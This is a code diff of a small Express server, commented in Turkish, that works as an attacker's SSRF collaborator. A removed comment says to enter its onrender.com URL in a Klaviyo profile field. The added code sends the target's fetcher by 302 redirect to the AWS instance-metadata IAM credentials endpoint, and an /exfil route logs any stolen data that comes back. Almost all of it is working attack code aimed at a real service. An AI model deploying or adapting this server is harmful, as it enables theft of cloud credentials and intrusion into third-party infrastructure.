@@ -4,7 +4,7 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// 1. Loglama ve İnceleme Rotası
+// Gelen istekleri ve query parametrelerini logla
 app.use((req, res, next) => {
     console.log('--- YENİ İSTEK GELDİ ---');
     console.log('Method:', req.method);
@@ -16,20 +16,25 @@ app.use((req, res, next) => {
     next();
 });
 
-// 2. SSRF / Redirect Tetikleme Rotası
-// Kullanım: Klaviyo profilindeki URL'ye şunu yazacaksın: 
-// https://collab-fv3u.onrender.com/redir?target=http://127.0.0.1:8080/
+// AWS Metadata veya İç Ağ Yönlendiricisi
 app.get('/redir', (req, res) => {
-    const target = req.query.target || 'http://127.0.0.1/';
-    console.log(`[!] Redirect tetiklendi! Hedef: ${target}`);
+    // Hedef olarak doğrudan AWS IMDSv1 Metadata adresini veriyoruz:
+    const target = req.query.target || 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
     
-    // 302 Found ile hedef iç adrese veya porta fırlatıyoruz
+    console.log(`[!] Metadata Redirect tetiklendi! Hedef: ${target}`);
+    
+    // 302 Found ile botu AWS Metadata servisine fırlat
     return res.redirect(302, target);
 });
 
-// 3. Varsayılan Yanıt
-app.use((req, res) => {
-    return res.status(200).send("Collaborator success");
+// Eğer bot metadata'dan okuduğu veriyi query parametresi olarak geri getirirse buraya düşecek
+app.get('/exfil', (req, res) => {
+    console.log('[+] VERİ SIZDIRILDI (EXFIL):', req.query);
+    return res.status(200).send("Data received");
 });
 
-app.listen(3000, () => console.log("Gelişmiş Collaborator 3000 portunda devrede!"));
+app.use((req, res) => {
+    return res.status(200).send("Collaborator OK");
+});
+
+app.listen(3000, () => console.log("Metadata Avcısı 3000 portunda devrede!"));
